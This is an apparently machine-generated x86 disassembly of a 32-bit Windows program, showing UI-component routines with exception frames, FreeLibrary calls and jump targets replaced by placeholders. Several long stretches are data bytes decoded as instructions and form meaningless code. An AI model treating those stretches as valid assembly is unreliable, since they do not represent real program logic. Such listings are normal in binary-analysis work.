sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_446168
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_431b20
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_431a0c
mov eax ebx
call sub_431200
mov eax ebx
call sub_45e134
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_43127c
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_4317b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_445f44
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4498ec
xor edx edx
push ebp
push sub_4318f0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_445ef8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_445f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4498f4
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_445f20
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4498ec
xor edx edx
push ebp
push sub_431883
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_445ed4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_445f20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4498f4
retn
jmp r-xdata
sub_431938
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_431a24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_447fd8
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_431938
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_43127c
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4317b4
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_43127c
sub al 0x2
jne r-xdata
sub_431acc
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_448080
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_43127c
sub al 0x2
jne r-xdata
mov eax esi
call sub_4317b4
mov eax esi
mov si 0xffc7
call sub_40346c
sub_431b20
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_40346c
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_431b68
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_4312e8
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_43127c
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_431bd8
push 0x270047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] ch
add [ eax ] al
push 0x2d0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] ch
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x150047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] dl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] bl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x50047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] al
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] cl
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add al dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] dl
cmp al [ edi ]
dec eax
sbb eax 0x3a080043
inc edi
add [ eax + 0x1d ] al
inc ebx
add [ eax ] al
cmp al [ edi ]
cmp [ 0x39f80043 ] bl
inc edi
add [ eax ] dh
sbb eax 0x39f00043
inc edi
add [ eax ] ch
sbb eax 0x39e80043
inc edi
add [ eax ] ah
sbb eax 0x39e00043
inc edi
add [ eax ] bl
sbb eax 0x39d80043
inc edi
add [ eax ] dl
sbb eax 0x39d00043
inc edi
add [ eax ] cl
sbb eax 0x39c80043
inc edi
add [ eax ] al
sbb eax 0x39c00043
inc edi
add al bh
sbb al 0x43
add [ eax - 0xfffb8c7 ] bh
sbb al 0x43
add [ eax - 0x17ffb8c7 ] dh
sbb al 0x43
add [ eax - 0x1fffb8c7 ] ch
sbb al 0x43
add [ eax - 0x27ffb8c7 ] ah
sbb al 0x43
add [ eax - 0x2fffb8c7 ] bl
sbb al 0x43
add [ eax - 0x37ffb8c7 ] dl
sbb al 0x43
add [ eax - 0x3fffb8c7 ] cl
sbb al 0x43
add [ eax - 0x47ffb8c7 ] al
sbb al 0x43
add [ eax + 0x39 ] bh
inc edi
add [ eax + 0x7000431c ] dh
cmp [ edi ] eax
test al 0x1c
inc ebx
add [ eax + 0x39 ] ch
inc edi
add [ eax + 0x6000431c ] ah
cmp [ edi ] eax
cwde
sbb al 0x43
add [ eax + 0x39 ] bl
inc edi
add [ eax + 0x5000431c ] dl
cmp [ edi ] eax
mov [ ebx + eax * 2 ] bl
add [ eax + 0x39 ] cl
inc edi
add [ eax + 0x4000431c ] al
cmp [ edi ] eax
js r-xdata
inc edi
add [ eax + 0x1c ] bl
inc ebx
inc ebx
add [ eax ] bh
cmp [ edi ] eax
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f0f
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a64
add [ eax ] dl
cmp [ edi ] eax
dec eax
sbb al 0x43
add [ eax ] cl
cmp [ edi ] eax
inc eax
sbb al 0x43
add [ eax ] al
cmp [ edi ] eax
cmp [ ebx + eax * 2 ] bl
add al bh
cmp [ edi ] al
xor [ ebx + eax * 2 ] bl
add al dh
cmp [ edi ] al
sub [ ebx + eax * 2 ] bl
add al ch
cmp [ edi ] al
and [ ebx + eax * 2 ] bl
add al ah
cmp [ edi ] al
sbb [ ebx + eax * 2 ] bl
add al bl
cmp [ edi ] al
adc [ ebx + eax * 2 ] bl
add al dl
cmp [ edi ] al
or [ ebx + eax * 2 ] bl
add al cl
cmp [ edi ] al
add [ ebx + eax * 2 ] bl
add al al
cmp [ edi ] al
clc
sbb eax [ ebx ]
mov eax 0xf0004738
sbb eax [ ebx ]
mov al 0x38
inc edi
add al ch
sbb eax [ ebx ]
test al 0x38
inc edi
add al ah
sbb eax [ ebx ]
mov al [ 0xffffffffd8004738 ]
sbb eax [ ebx ]
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431f08
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc edi
add [ eax + 0x1c ] dl
inc ebx
add [ eax ] bl
cmp [ edi ] eax
push eax
sbb al 0x43
inc ebx
add [ eax ] dh
cmp [ edi ] eax
push 0x2800431c
cmp [ edi ] eax
pushad
sbb al 0x43
add [ eax ] ah
cmp [ edi ] eax
pop eax
sbb al 0x43
sub_431f44
push 0xf60047b6
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_431f71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f78
retn
sub_431f84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431fb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431fbc
retn
mov eax [ rw-data ]
call sub_403270
sub_43206c
or al [ eax ]
add [ eax ] al
cmp al 0x3a
inc edi
add [ eax - 0x5d ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bh
cmp al [ edi ]
and al 0xa2
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edi ] dh
inc edi
add al al
mov eax [ 0x47 ]
add [ eax ] al
xor [ edx ] bh
inc edi
add [ edx + 0x47 ] ch
add [ eax ] al
sub al 0x3a
inc edi
add [ eax + 0x47a3 ] cl
add [ eax ] al
add [ eax ] ch
cmp al [ edi ]
mov ah 0xa5
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edi ] ah
inc edi
add [ ebx + 0x47 ] bh
add [ eax ] al
and [ edx ] bh
inc edi
add [ esp + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ edx + edi ] bl
inc edi
add [ eax + 0x47a5 ] dl
add [ eax ] al
add [ eax ] bl
cmp al [ edi ]
loopne r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432114
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43211b
retn
call sub_432050
sub_432148
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43216d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432174
retn
sub_43218f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4321d4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4321db
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a64
sub_4321f7
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43223c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432243
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a64
sub_432253
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4322a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4322b0
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403fe8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4322bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432300
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432307
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_432314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432340
retn
sub_43234c
push eax
and eax [ ebx ]
add edx [ ecx ]
push esp
push ebx
je r-xdata
or [ eax + 0x62 ] esi
je r-xdata
add [ eax ] bh
jb r-xdata
insd
inc ebx
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
mov [ ecx ] es
dec eax
bound eax [ ebx ]
cmp [ ebx + 0x43 ] ah
add [ eax ] ch
nop
inc ecx
add [ eax - 0x70 ] bl
or [ fs : eax + 0x62 ] dh
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] ch
add [ eax ] al
or al 0x54
push ebx
je r-xdata
insb
jae r-xdata
add [ eax ] al
mov [ ebx ] fs
inc ebx
add [ esi ] al
jo r-xdata
popad
outsb
insb
push ebx
je r-xdata
add [ esi ] dl
add [ eax ] al
jmp [ edx + 0x62b80043 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
dec esp
and eax [ ebx ]
push es
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add ah bh
popad
inc ebx
add [ esi ] cl
add [ eax ] al
and [ ebx + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] al
inc ebx
xor al [ eax ]
and al 0x32
inc eax
add ah bl
mov es [ ecx ]
xor [ ecx + eax * 2 + 0x418c3800 ] cl
add [ eax + 0x62 ] cl
inc ebx
add [ eax ] bh
arpl [ ebx ] ax
sub [ eax - 0x6fa7ffbf ] dl
dec esp
outsd
ja r-xdata
dec esi
outsd
add [ esp + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
and al 0x43
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x43 ] cl
add [ esi ] al
add [ eax ] eax
add eax 0x65766542
insb
mov [ ebx ] fs
inc ebx
add [ 0x6cff0000 ] dl
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
outsb
insb
nop
and al 0x43
add [ edi ] al
or al 0x54
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
inc ebx
push esp
js r-xdata
or al 0x57
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x24 ] dl
inc ebx
or esi [ eax + 0x73 ]
dec edi
ja r-xdata
add [ eax + 0x42080002 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ss
add [ eax ] al
jae r-xdata
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x25c4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc ebx
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
popad
outsb
insb
and [ ebx + eax * 2 ] ah
add [ eax ] bl
popad
inc ecx
add [ edi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x6f430864
jb r-xdata
jae r-xdata
jae r-xdata
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4c65646f
and eax [ ebx ]
sbb [ eax ] al
add bh bh
jl r-xdata
inc eax
bound eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
push cs
push eax
popad
jb r-xdata
insb
jae r-xdata
ja r-xdata
add [ eax ] dh
push esp
push ebx
je r-xdata
push es
push ebx
outsb
jb r-xdata
popad
outsb
insb
jae r-xdata
add [ ebp + edx * 4 - 0x6a77ffbf ] al
inc ecx
add [ ebp + edx * 4 - 0x6a83ffbf ] cl
inc ecx
add [ eax - 0x6f ] al
inc ecx
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
mov ah 0x63
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050006 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax ] al
add [ eax ] al
or [ esi ] ah
inc ebx
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x6c797453
lodsb [ gs : esi ]
adc [ eax ] al
or al 0x0
add bh bh
mov [ ebx + 0x43 ] fs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040005 ] al
add bh bh
pop esp
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax + 0x14004156 ] bl
add [ eax ] al
[ ebx + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
nop
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ ebx + ebx * 8 + 0x44 ] ch
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
je r-xdata
add [ edx ] ecx
push esp
inc ebx
jne r-xdata
and eax 0x25f40043
inc ebx
add [ eax + eax ] bl
add [ eax ] al
inc esp
popad
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add ah dl
nop
inc ecx
add [ eax ] dh
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x41914000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
ror [ eax ] 0x26
inc ebx
add [ edi ] al
or eax 0x61745354
je r-xdata
add [ eax + eax ] bl
add [ eax ] al
je r-xdata
mov [ eax + 0x41 ] fs
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
insb
jae r-xdata
inc esp
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ ebp + 0x43 ] ch
add ah bl
mov eax [ 0x65f00044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc ebx
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] dh
jo r-xdata
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
nop
jae r-xdata
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
adc al 0x88
adc [ ebx + edx * 2 + 0x74 ] edx
popad
or [ edx ] dh
inc eax
add [ edx + esi ] ah
je r-xdata
sub [ ebx ] al
add [ eax ] al
add [ eax ] al
fsub [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004327 ] dh
jae r-xdata
xor al 0x40
add [ eax + 0x8004034 ] ch
jae r-xdata
inc ebx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432340
retn
and eax [ ebx ]
add edx [ ecx ]
push esp
push ebx
je r-xdata
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + esi * 2 ] cl
inc ebx
add [ eax ] ch
iretd
inc eax
add [ eax ] dh
inc ebx
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
insd
push ebx
je r-xdata
inc edx
popad
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
and al 0x43
popad
outsb
insb
inc edx
jbe r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
js r-xdata
inc edx
add ah bl
or al 0x42
xor [ ecx ] cl
je r-xdata
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
or dl [ eax + 0x61 ]
jl r-xdata
and eax 0x61f00043
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax - 0x4bffbfcc ] dh
outsb
or [ gs : eax + 0x62 ] esi
insb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + 0x70060043 ] cl
bound ecx [ esi + 0x6f ]
inc ebx
jae r-xdata
je r-xdata
inc ecx
